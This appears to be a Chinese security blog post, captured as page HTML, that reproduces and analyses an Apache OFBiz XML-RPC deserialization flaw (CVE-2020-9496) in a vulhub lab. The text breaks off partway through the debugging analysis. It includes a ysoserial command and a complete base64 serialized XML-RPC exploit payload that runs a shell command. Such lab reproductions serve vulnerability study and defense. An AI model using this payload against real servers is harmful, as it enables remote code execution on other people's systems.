@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Apache OfBiz 反序列化命令（CVE-2020-9496） - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/apacheofbiz/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="Apache OfBiz 反序列化命令（CVE-2020-9496）">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-06T20:58:47+00:00">
+    <meta property="article:modified_time" content="2025-04-06T20:58:47+00:00">
+    <meta property="article:tag" content="Java">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="Apache OfBiz 反序列化命令（CVE-2020-9496）">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/apacheofbiz/" /><link rel="prev" href="http://localhost:1313/posts/jndi-ldap/" /><link rel="next" href="http://localhost:1313/posts/%E5%8D%8E%E5%A4%8Fcms/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Apache OfBiz 反序列化命令（CVE-2020-9496）",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/apacheofbiz\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "java","wordcount":  1594 ,
+        "url": "http:\/\/localhost:1313\/posts\/apacheofbiz\/","datePublished": "2025-04-06T20:58:47+00:00","dateModified": "2025-04-06T20:58:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Apache OfBiz 反序列化命令（CVE-2020-9496）</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/javasec/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Javasec</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-04-06">2025-04-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1594 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a>
+      <ul>
+        <li><a href="#xml-rpc消息">XML-RPC消息</a></li>
+        <li><a href="#调试分析">调试分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞修复">漏洞修复</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="apache-ofbiz-反序列化命令cve-2020-9496">Apache OfBiz 反序列化命令（CVE-2020-9496）</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Apache OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。 OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。</p>
+<p>其17.12.04版本之前的XMLRPC接口存在一处反序列化漏洞，攻击者利用这个漏洞可以在目标服务器上执行任意命令。</p>
+<h2 id="环境搭建">环境搭建</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> vulhub-master/ofbiz/ofbiz/CVE-2020-9496
+</span></span><span class="line"><span class="cl">docker-compose up -d</span></span></code></pre></div></div><p>然后访问 <code>https://localhost:8443/accounting/control/main</code>，注意需要用 https 协议</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151809899.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151809899.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151809899.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151809899.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151809899.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151809899.png" /></p>
+<p>源码下载地址：<a href="https://archive.apache.org/dist/ofbiz/" target="_blank" rel="noopener noreffer ">https://archive.apache.org/dist/ofbiz/</a>，下载 ofbiz17.12.1 版本，用 idea 打开看到 gradle 构建全是报错，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154642698.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154642698.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154642698.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154642698.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154642698.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154642698.png" /></p>
+<p>vulhub 开启了调试端口，直接配置远程调试好了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508155109879.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508155109879.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508155109879.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508155109879.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508155109879.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508155109879.png" /></p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>利用 ysoseral 生成反序列化 payload，</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="s2">&#34;touch /tmp/success&#34;</span><span class="p">|</span>base64 -w <span class="m">0</span></span></span></code></pre></div></div><p>得到poc</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;methodCall&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;methodName&gt;</span>ProjectDiscovery<span class="nt">&lt;/methodName&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;params&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;param&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;value&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;struct&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;member&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;name&gt;</span>test<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;value&gt;</span>
+</span></span><span class="line"><span class="cl">              <span class="nt">&lt;serializable</span> <span class="na">xmlns=</span><span class="s">&#34;http://ws.apache.org/xmlrpc/namespaces/extensions&#34;</span><span class="nt">&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqTK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASdG91Y2ggL3RtcC9zdWNjZXNzCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAceXNvc2VyaWFsL1B3bmVyMTg4NDg3MTkxMzczOQEAHkx5c29zZXJpYWwvUHduZXIxODg0ODcxOTEzNzM5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AEAAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4cQB+AA14<span class="nt">&lt;/serializable&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&lt;/member&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/struct&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/param&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/params&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/methodCall&gt;</span></span></span></code></pre></div></div><p>利用 bp 进行发包</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508152011285.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508152011285.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508152011285.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508152011285.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508152011285.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508152011285.png" /></p>
+<p>看见成功反序列化并执行命令</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151932819.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151932819.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151932819.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151932819.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151932819.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508151932819.png" /></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<h3 id="xml-rpc消息">XML-RPC消息</h3>
+<p>在漏洞分析前先简单了解一下 XML-RPC 消息。</p>
+<p><strong>一、XML-RPC数据类型</strong></p>
+<p>xmlrpc支持多种数据类型，对应的xml标签包括 <code>base64</code>、<code>struct</code>、<code>array</code> 等，下面是几种常见的数据类型</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- array --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;value&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;array&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;data&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;value&gt;&lt;int&gt;</span>7<span class="nt">&lt;/int&gt;&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/data&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/array&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- struct --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;struct&gt;</span> 
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;member&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>foo<span class="nt">&lt;/name&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;value&gt;</span>bar<span class="nt">&lt;/value&gt;</span> 
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/member&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/struct&gt;</span></span></span></code></pre></div></div><p><strong>二、XML-RPC消息格式</strong></p>
+<p>每个XML-RPC请求都以<code>&lt;methodCall&gt;&lt;/methodCall&gt;</code>开头，该元素包含单个子元素<code>&lt;methodName&gt;method&lt;/methodName&gt;</code>，元素<code>&lt;methodName&gt;</code>包含子元素<code>&lt;params&gt;</code>，<code>&lt;params&gt;</code>可以包含一个或多个<code>&lt;param&gt;</code>元素。如：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/RPC2</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Frontier/5.1.2 (WinNT)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">betty.userland.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-length</span><span class="o">:</span> <span class="l">181</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;methodCall&gt;</span> 
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;methodName&gt;</span>examples.getStateName<span class="nt">&lt;/methodName&gt;</span>  
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;params&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;param&gt;</span> 
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;value&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;i4&gt;</span>41<span class="nt">&lt;/i4&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/value&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/param&gt;</span> 
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/params&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/methodCall&gt;</span></span></span></code></pre></div></div><h3 id="调试分析">调试分析</h3>
+<p>根据路由 <code>/webtools/control/xmlrpc</code> 定位到 <code>framework/webtools/webapp/webtools/WEB-INF/web.xml</code> 文件，看具体处理的类是哪个</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154241860.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154241860.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154241860.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154241860.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154241860.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250508154241860.png" /></p>
+<p>看到处理类是 <code>org.apache.ofbiz.webapp.control.ControlServlet</code>，那么跟进这个类，在其 dopost 方法上下上断点，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
